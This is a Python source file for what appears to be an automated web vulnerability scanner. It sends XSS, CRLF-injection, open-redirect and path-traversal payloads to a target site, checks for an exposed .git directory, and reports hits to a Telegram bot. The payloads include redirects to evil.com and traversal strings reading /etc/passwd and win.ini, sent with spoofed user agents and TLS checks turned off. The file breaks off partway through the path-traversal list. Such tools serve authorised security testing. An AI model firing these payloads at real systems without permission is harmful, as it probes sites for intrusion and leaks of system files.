import re 
import requests
import random
import sys
import threading
import queue
from multiprocessing import Process
from core import bot

from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)  


USR_AGENTS=[
'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE51-1/220.34.37; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413', 
'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/11.0.026; Profile MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413', 
'Mozilla/5.0 (SymbianOS/9.3; U; Series60/3.2 Nokia5630d-1/012.020; Profile MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413', 
'Mozilla/5.0 (SymbianOS/9.3; U; Series60/3.2 NokiaN78-1/12.046; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413', 
'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-3/21.2.045; Profile/MIDP-2.1 Configuration/CLDC-1.1;) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.4', 
'Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 Nokia5530c-2/10.0.050; Profile MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Safari/525', 
'Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 Nokia5800d-1/31.0.101; Profile MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413', 
'Mozilla/5.0 (webOS/1.4.0; U; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Version/1.0 Safari/532.2 Pre/1.0', 
'Mozilla/5.0 (webOS/Palm webOS 1.2.9; U; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/1.0 Safari/525.27.1 Pixi/1.0', 
'Mozilla/5.0 (Windows; U; Win98; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1', 
'Mozilla/5.0 (Windows; U; Win98; en-US; rv:x.xx) Gecko/20030423 Firebird Browser/0.6', 
'Mozilla/5.0 (Windows; U; Win9x; en; Stable) Gecko/20020911 Beonex/0.8.1-stable', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008092215 Firefox/3.0.1 Orca/1.1 beta 3', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.x.x) Gecko/20041107 Firefox/x.x', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.xx) Gecko/20030504 Mozilla Firebird/0.6', 
'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.xxx) Gecko/20041027 Mnenhy/0.6.0.104', 
'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5', 
'Mozilla/5.0 (Windows; U;XMPP Tiscali Communicator v.10.0.1; Windows NT 5.1; it; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3', 
'Mozilla/5.0 (X11; Linux i686; U;rv: 1.7.13) Gecko/20070322 Kazehakase/0.4.4.1', 
'Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01', 
'Mozilla/5.0 (X11; U; Linux armv7l; en-GB; rv:1.9.2b6pre) Gecko/20100318 Firefox/3.5 Maemo Browser 1.7.4.8 RX-51 N900', 
'Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0', 
'Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; Nautilus/1.0Final) Gecko/20020408', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.2b) Gecko/20021007 Phoenix/0.3', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040413 Epiphany/1.2.1', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 SnapPreviewBot', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061129 BonEcho/2.0', 
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)', 
'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9a8) Gecko/2007100619 GranParadiso/3.0a8', 
]






def xss_(link):
    XSS={'a<T"rSAF45>':'a%3CT%22rSAF45%3E.x','a<T"rSAF45.x':'a%3CT%22rSAF45.x','TrS"AF45<':'TrS%22AF45%3C','<TrSA"AF45':'<TrSA"AF45.x',
'TrSAAFF"45<':'TrSAAFF"45<','TrSAA"F45<':'TrSAA%22F45%3C','TrSA"AF45>':'TrSA"AF45>','Tr"SA<F45':'Tr%22SA%3CF45',
'TrSA>F"45':'TrSA%3EF%2245','TrSA<AF4"5':'TrSA<AF4"5','T"rSA>AF45':'T"rSA>AF45'}
    for rg,p in XSS.items():
            
        user_agent=random.choice(USR_AGENTS)
        headers = {'User-Agent': user_agent } 
        url=link+'/'+p
        try:
            
            r = requests.get(url ,headers=headers ,verify=False )       
            resp = r.content
            ContentType=r.headers.get('Content-Type')
            x = re.findall(rg, str(resp))
            if (x):
                if 'text/html' in str(ContentType):
                    print('\033[91mPossibly XSS vulnerability\033[00m  '+url)
                    msg="Possibly XSS vulnerability "+url
                    bot.telegram_bot_sendtext(msg)
                        
                else:
                    print('\033[33;1mWarning can be false positives \033[00m')
                    print('\033[91mPossibly XSS vulnerability\033[00m  '+url)
                    msg="Possibly XSS vulnerability "+url
                    bot.telegram_bot_sendtext(msg)
            
        except:
            pass
                          
          
    pay="?q=a%3CT%22rSAF45&s=a%3CT%22rSAF45&search=a%3CT%22rSAF45&id=a%3CT%22rSAF45&action=a%3CT%22rSAF45&keyword=a%3CT%22rSAF45&query=a%3CT%22rSAF45&page=a%3CT%22rSAF45&keywords=a%3CT%22rSAF45&url=a%3CT%22rSAF45&view=a%3CT%22rSAF45&cat=a%3CT%22rSAF45&name=a%3CT%22rSAF45&key=a%3CT%22rSAF45&p=a%3CT%22rSAF45"
    rg1='a<T"rSAF45'        
    user_agent=random.choice(USR_AGENTS)
    headers = {'User-Agent': user_agent }
    url1=link+pay
   
    try:
        r1 = requests.get(url1 ,headers=headers ,verify=False )
        resp1 = r1.content 
        ContentType=r1.headers.get('Content-Type')   
        x1 = re.findall(rg1, str(resp1))
        if (x1):
            if 'text/html' in str(ContentType):
                print('\033[91mPossibly XSS vulnerability\033[00m  '+url1)
                msg="Possibly XSS vulnerability "+url
                bot.telegram_bot_sendtext(msg)
            else:
                print('\033[33;1mWarning can be false positives \033[00m')
                print('\033[91mPossibly XSS vulnerability\033[00m  '+url1)
                msg="Possibly XSS vulnerability "+url
                bot.telegram_bot_sendtext(msg)
                              
    except:
        pass
           
def git_(i):
    
   
    user_agent=random.choice(USR_AGENTS)
    headers = {'User-Agent': user_agent } 
    url=i+'/.git/HEAD'
    try:
        r = requests.get(url ,headers=headers ,verify=False )       
        resp = r.content
        x = re.findall('refs/heads', str(resp))
        if (x):
            print('\033[91mPossibly exposes Git configuration\033[00m  '+url)
            msg="Possibly exposes Git configuration fond  "+url
            bot.telegram_bot_sendtext(msg)
    except:
        pass


def crlf_(i):
   
    lis=["%0D%0ASet-Cookie:crlfinjection=crlfinjection","%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection","%0DSet-Cookie:crlfinjection=crlfinjection","%0ASet-Cookie:crlfinjection=crlfinjection","%3F%0DSet-Cookie%3Acrlfinjection=crlfinjection","%0ASet-Cookie%3Acrlfinjection/..","~user/%0D%0ASet-Cookie:crlfinjection","?Page=%0D%0ASet-Cookie:crlfinjection=crlfinjection&_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&callback=%0D%0ASet-Cookie:crlfinjection=crlfinjection&checkout_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&content=%0D%0ASet-Cookie:crlfinjection=crlfinjection&continue=%0D%0ASet-Cookie:crlfinjection=crlfinjection&continueTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection&counturl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&data=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dest=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dest_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dir=%0D%0ASet-Cookie:crlfinjection=crlfinjection&document=%0D%0ASet-Cookie:crlfinjection=crlfinjection&domain=%0D%0ASet-Cookie:crlfinjection=crlfinjection&done=%0D%0ASet-Cookie:crlfinjection=crlfinjection&download=%0D%0ASet-Cookie:crlfinjection=crlfinjection&feed=%0D%0ASet-Cookie:crlfinjection=crlfinjection&file=%0D%0ASet-Cookie:crlfinjection=crlfinjection&host=%0D%0ASet-Cookie:crlfinjection=crlfinjection&html=%0D%0ASet-Cookie:crlfinjection=crlfinjection&http=%0D%0ASet-Cookie:crlfinjection=crlfinjection&https=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image_src=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&imageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&include=%0D%0ASet-Cookie:crlfinjection=crlfinjection&media=%0D%0ASet-Cookie:crlfinjection=crlfinjection&navigation=%0D%0ASet-Cookie:crlfinjection=crlfinjection&next=%0D%0ASet-Cookie:crlfinjection=crlfinjection&open=%0D%0ASet-Cookie:crlfinjection=crlfinjection&out=%0D%0ASet-Cookie:crlfinjection=crlfinjection&page=%0D%0ASet-Cookie:crlfinjection=crlfinjection&page_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&pageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&path=%0D%0ASet-Cookie:crlfinjection=crlfinjection&picture=%0D%0ASet-Cookie:crlfinjection=crlfinjection&port=%0D%0ASet-Cookie:crlfinjection=crlfinjection&proxy=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redir=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirect=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirectUri&redirectUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&reference=%0D%0ASet-Cookie:crlfinjection=crlfinjection&referrer=%0D%0ASet-Cookie:crlfinjection=crlfinjection&req=%0D%0ASet-Cookie:crlfinjection=crlfinjection&request=%0D%0ASet-Cookie:crlfinjection=crlfinjection&retUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return=%0D%0ASet-Cookie:crlfinjection=crlfinjection&returnTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return_path=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection&rurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&show=%0D%0ASet-Cookie:crlfinjection=crlfinjection&site=%0D%0ASet-Cookie:crlfinjection=crlfinjection&source=%0D%0ASet-Cookie:crlfinjection=crlfinjection&src=%0D%0ASet-Cookie:crlfinjection=crlfinjection&target=%0D%0ASet-Cookie:crlfinjection=crlfinjection&to=%0D%0ASet-Cookie:crlfinjection=crlfinjection&uri=%0D%0ASet-Cookie:crlfinjection=crlfinjection&url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&val=%0D%0ASet-Cookie:crlfinjection=crlfinjection&validate=%0D%0ASet-Cookie:crlfinjection=crlfinjection&view=%0D%0ASet-Cookie:crlfinjection=crlfinjection&window=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirect_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection"]
    regix='(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
    for x in lis:
        x=x.rstrip()
        url=i+'/'+x
        try:
            r = requests.head(url,verify=False)
            resp = r.content
            x = re.findall(regix, str(resp))
            if (x):
                print('\033[91mPossibly crlf injection vulnerability\033[00m  '+url)
                msg="Possibly CRLF injection vulnerability "+url
                bot.telegram_bot_sendtext(msg)
        except:
            pass


def openredaraction_(i):
   
    lis=["/#/path///evil.com","evil.com/","evil.com//","//;@evil.com","//evil.com/%2F..","////evil.com","/evil.com/%2F..","/evil.com/..;/css","evil%E3%80%82com","%5Cevil.com","ZXZpbC5jb20=","aHR0cDovL2V2aWwuY29t","?Page=evil.com&_url=evil.com&callback=evil.com&checkout_url=evil.com&content=evil.com&continue=evil.com&continueTo=evil.com&counturl=evil.com&data=evil.com&dest=evil.com&dest_url=evil.com&dir=evil.com&document=evil.com&domain=evil.com&done=evil.com&download=evil.com&feed=evil.com&file=evil.com&host=evil.com&html=evil.com&http=evil.com&https=evil.com&image=evil.com&image_src=evil.com&image_url=evil.com&imageurl=evil.com&include=evil.com&langTo=evil.com&media=evil.com&navigation=evil.com&next=evil.com&open=evil.com&out=evil.com&page=evil.com&page_url=evil.com&pageurl=evil.com&path=evil.com&picture=evil.com&port=evil.com&proxy=evil.com&redir=evil.com&redirect=evil.com&redirectUri=evil.com&redirectUrl=evil.com&reference=evil.com&referrer=evil.com&req=evil.com&request=evil.com&retUrl=evil.com&return=evil.com&returnTo=evil.com&return_path=evil.com&return_to=evil.com&rurl=evil.com&show=evil.com&site=evil.com&source=evil.com&src=evil.com&target=evil.com&to=evil.com&uri=evil.com&url=evil.com&val=evil.com&validate=evil.com&view=evil.com&window=evil.com&redirect_to=evil.com",
    "?Page=ZXZpbC5jb20=&_url=ZXZpbC5jb20=&callback=ZXZpbC5jb20=&checkout_url=ZXZpbC5jb20=&content=ZXZpbC5jb20=&continue=ZXZpbC5jb20=&continueTo=ZXZpbC5jb20=&counturl=ZXZpbC5jb20=&data=ZXZpbC5jb20=&dest=ZXZpbC5jb20=&dest_url=ZXZpbC5jb20=&dir=ZXZpbC5jb20=&document=ZXZpbC5jb20=&domain=ZXZpbC5jb20=&done=ZXZpbC5jb20=&download=ZXZpbC5jb20=&feed=ZXZpbC5jb20=&file=ZXZpbC5jb20=&host=ZXZpbC5jb20=&html=ZXZpbC5jb20=&http=ZXZpbC5jb20=&https=ZXZpbC5jb20=&image=ZXZpbC5jb20=&image_src=ZXZpbC5jb20=&image_url=ZXZpbC5jb20=&imageurl=ZXZpbC5jb20=&include=ZXZpbC5jb20=&langTo=ZXZpbC5jb20=&media=ZXZpbC5jb20=&navigation=ZXZpbC5jb20=&next=ZXZpbC5jb20=&open=ZXZpbC5jb20=&out=ZXZpbC5jb20=&page=ZXZpbC5jb20=&page_url=ZXZpbC5jb20=&pageurl=ZXZpbC5jb20=&path=ZXZpbC5jb20=&picture=ZXZpbC5jb20=&port=ZXZpbC5jb20=&proxy=ZXZpbC5jb20=&redir=ZXZpbC5jb20=&redirect=ZXZpbC5jb20=&redirectUri=ZXZpbC5jb20=&redirectUrl=ZXZpbC5jb20=&reference=ZXZpbC5jb20=&referrer=ZXZpbC5jb20=&req=ZXZpbC5jb20=&request=ZXZpbC5jb20=&retUrl=ZXZpbC5jb20=&return=ZXZpbC5jb20=&returnTo=ZXZpbC5jb20=&return_path=ZXZpbC5jb20=&return_to=ZXZpbC5jb20=&rurl=ZXZpbC5jb20=&show=ZXZpbC5jb20=&site=ZXZpbC5jb20=&source=ZXZpbC5jb20=&src=ZXZpbC5jb20=&target=ZXZpbC5jb20=&to=ZXZpbC5jb20=&uri=ZXZpbC5jb20=&url=ZXZpbC5jb20=&val=ZXZpbC5jb20=&validate=ZXZpbC5jb20=&view=ZXZpbC5jb20=&window=ZXZpbC5jb20=&redirect_to=ZXZpbC5jb20=",
"?Page=aHR0cDovL2V2aWwuY29t&_url=aHR0cDovL2V2aWwuY29t&callback=aHR0cDovL2V2aWwuY29t&checkout_url=aHR0cDovL2V2aWwuY29t&content=aHR0cDovL2V2aWwuY29t&continue=aHR0cDovL2V2aWwuY29t&continueTo=aHR0cDovL2V2aWwuY29t&counturl=aHR0cDovL2V2aWwuY29t&data=aHR0cDovL2V2aWwuY29t&dest=aHR0cDovL2V2aWwuY29t&dest_url=aHR0cDovL2V2aWwuY29t&dir=aHR0cDovL2V2aWwuY29t&document=aHR0cDovL2V2aWwuY29t&domain=aHR0cDovL2V2aWwuY29t&done=aHR0cDovL2V2aWwuY29t&download=aHR0cDovL2V2aWwuY29t&feed=aHR0cDovL2V2aWwuY29t&file=aHR0cDovL2V2aWwuY29t&host=aHR0cDovL2V2aWwuY29t&html=aHR0cDovL2V2aWwuY29t&http=aHR0cDovL2V2aWwuY29t&https=aHR0cDovL2V2aWwuY29t&image=aHR0cDovL2V2aWwuY29t&image_src=aHR0cDovL2V2aWwuY29t&image_url=aHR0cDovL2V2aWwuY29t&imageurl=aHR0cDovL2V2aWwuY29t&include=aHR0cDovL2V2aWwuY29t&langTo=aHR0cDovL2V2aWwuY29t&media=aHR0cDovL2V2aWwuY29t&navigation=aHR0cDovL2V2aWwuY29t&next=aHR0cDovL2V2aWwuY29t&open=aHR0cDovL2V2aWwuY29t&out=aHR0cDovL2V2aWwuY29t&page=aHR0cDovL2V2aWwuY29t&page_url=aHR0cDovL2V2aWwuY29t&pageurl=aHR0cDovL2V2aWwuY29t&path=aHR0cDovL2V2aWwuY29t&picture=aHR0cDovL2V2aWwuY29t&port=aHR0cDovL2V2aWwuY29t&proxy=aHR0cDovL2V2aWwuY29t&redir=aHR0cDovL2V2aWwuY29t&redirect=aHR0cDovL2V2aWwuY29t&redirectUri=aHR0cDovL2V2aWwuY29t&redirectUrl=aHR0cDovL2V2aWwuY29t&reference=aHR0cDovL2V2aWwuY29t&referrer=aHR0cDovL2V2aWwuY29t&req=aHR0cDovL2V2aWwuY29t&request=aHR0cDovL2V2aWwuY29t&retUrl=aHR0cDovL2V2aWwuY29t&return=aHR0cDovL2V2aWwuY29t&returnTo=aHR0cDovL2V2aWwuY29t&return_path=aHR0cDovL2V2aWwuY29t&return_to=aHR0cDovL2V2aWwuY29t&rurl=aHR0cDovL2V2aWwuY29t&show=aHR0cDovL2V2aWwuY29t&site=aHR0cDovL2V2aWwuY29t&source=aHR0cDovL2V2aWwuY29t&src=aHR0cDovL2V2aWwuY29t&target=aHR0cDovL2V2aWwuY29t&to=aHR0cDovL2V2aWwuY29t&uri=aHR0cDovL2V2aWwuY29t&url=aHR0cDovL2V2aWwuY29t&val=aHR0cDovL2V2aWwuY29t&validate=aHR0cDovL2V2aWwuY29t&view=aHR0cDovL2V2aWwuY29t&window=aHR0cDovL2V2aWwuY29t&redirect_to=aHR0cDovL2V2aWwuY29t"
    ]
    regix='(?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_]*\.)?evil\.com(?:\s*?)$'
    for x in lis:
        x=x.rstrip()
        url=i+'/'+x
        try:
            r = requests.head(url,verify=False)
            resp = r.content
            x = re.findall(regix, str(resp))
            if (x):
                print('\033[91mPossibly open redrection vulnerability\033[00m  '+url)
                msg="Possibly open redrection vulnerability "+url
                bot.telegram_bot_sendtext(msg)
        except:
            pass

def lfi_(i):
    pay=["/?q=../../../etc/passwd&s=../../../etc/passwd&search=../../../etc/passwd&id=&action=../../../etc/passwd&keyword=../../../etc/passwd&query=../../../etc/passwd&page=../../../etc/passwd&keywords=../../../etc/passwd&url=../../../etc/passwd&view=../../../etc/passwd&cat=../../../etc/passwd&name=../../../etc/passwd&key=../../../etc/passwd&p=../../../etc/passwd",
    "/?q=../../../etc/passwd%00&s=../../../etc/passwd%00&search=../../../etc/passwd%00&id=../../../etc/passwd%00&action=../../../etc/passwd%00&keyword=../../../etc/passwd%00&query=../../../etc/passwd%00&page=../../../etc/passwd%00&keywords=../../../etc/passwd%00&url=../../../etc/passwd%00&view=../../../etc/passwd%00&cat=../../../etc/passwd%00&name=../../../etc/passwd%00&key=../../../etc/passwd%00&p=../../../etc/passwd%00",
    "/?q=%252e%252e%252fetc%252fpasswd&s=%252e%252e%252fetc%252fpasswd&search=%252e%252e%252fetc%252fpasswd&id=%252e%252e%252fetc%252fpasswd&action=%252e%252e%252fetc%252fpasswd&keyword=%252e%252e%252fetc%252fpasswd&query=%252e%252e%252fetc%252fpasswd&page=%252e%252e%252fetc%252fpasswd&keywords=%252e%252e%252fetc%252fpasswd&url=%252e%252e%252fetc%252fpasswd&view=%252e%252e%252fetc%252fpasswd&cat=%252e%252e%252fetc%252fpasswd&name=%252e%252e%252fetc%252fpasswd&key=%252e%252e%252fetc%252fpasswd&p=%252e%252e%252fetc%252fpasswd",
    "/?q=%252e%252e%252fetc%252fpasswd%00&s=%252e%252e%252fetc%252fpasswd%00&search=%252e%252e%252fetc%252fpasswd%00&id=%252e%252e%252fetc%252fpasswd%00&action=%252e%252e%252fetc%252fpasswd%00&keyword=%252e%252e%252fetc%252fpasswd%00&query=%252e%252e%252fetc%252fpasswd%00&page=%252e%252e%252fetc%252fpasswd%00&keywords=%252e%252e%252fetc%252fpasswd%00&url=%252e%252e%252fetc%252fpasswd%00&view=%252e%252e%252fetc%252fpasswd%00&cat=%252e%252e%252fetc%252fpasswd%00&name=%252e%252e%252fetc%252fpasswd%00&key=%252e%252e%252fetc%252fpasswd%00&p=%252e%252e%252fetc%252fpasswd%00",
    "/?q=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&s=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&search=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&id=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&action=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&keyword=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&query=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&keywords=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&url=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&view=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&cat=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&name=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&key=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&p=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "/?q=....//....//etc/passwd&s=....//....//etc/passwd&search=....//....//etc/passwd&id=....//....//etc/passwd&action=....//....//etc/passwd&keyword=....//....//etc/passwd&query=....//....//etc/passwd&page=....//....//etc/passwd&keywords=....//....//etc/passwd&url=....//....//etc/passwd&view=....//....//etc/passwd&cat=....//....//etc/passwd&name=....//....//etc/passwd&key=....//....//etc/passwd&p=....//....//etc/passwd",
    "/?q=..///////..////..//////etc/passwd&s=..///////..////..//////etc/passwd&search=..///////..////..//////etc/passwd&id=..///////..////..//////etc/passwd&action=..///////..////..//////etc/passwd&keyword=..///////..////..//////etc/passwd&query=..///////..////..//////etc/passwd&page=..///////..////..//////etc/passwd&keywords=..///////..////..//////etc/passwd&url=..///////..////..//////etc/passwd&view=..///////..////..//////etc/passwd&cat=..///////..////..//////etc/passwd&name=..///////..////..//////etc/passwd&key=..///////..////..//////etc/passwd&p=..///////..////..//////etc/passwd",
    "/?q=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&s=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&search=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&id=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&action=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&keyword=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&query=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&keywords=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&url=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&view=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&cat=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&name=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&key=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&p=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
    "/?q=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&s=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&search=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&id=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&action=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&keyword=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&query=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&keywords=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&url=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&view=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&cat=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&name=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&key=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&p=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
    "/?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/?redirect=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "/?redirect=..%2f..%2f..%2f..%2fwindows/win.ini",
    "/?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
    "/?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
    "../../../etc/passwd",
    "../../../etc/passwd%00"
    "%252e%252e%252fetc%252fpasswd",
    "%252e%252e%252fetc%252fpasswd%00",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "....//....//etc/passwd",
    "..///////..////..//////etc/passwd",
    "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "../../../windows/win.ini",
    "../../../windows/win.ini%00"
    "%252e%252e%252fetc%252fpasswd",
    "%252e%252e%252fetc%252fpasswd%00",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
    "....//....//windows/win.ini",
    "..///////..////..//////windows/win.ini",
    "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini",
    "/?q=../../../windows/win.ini&s=../../../windows/win.ini&search=../../../windows/win.ini&id=&action=../../../windows/win.ini&keyword=../../../windows/win.ini&query=../../../windows/win.ini&page=../../../windows/win.ini&keywords=../../../windows/win.ini&url=../../../windows/win.ini&view=../../../windows/win.ini&cat=../../../windows/win.ini&name=../../../windows/win.ini&key=../../../windows/win.ini&p=../../../windows/win.ini",
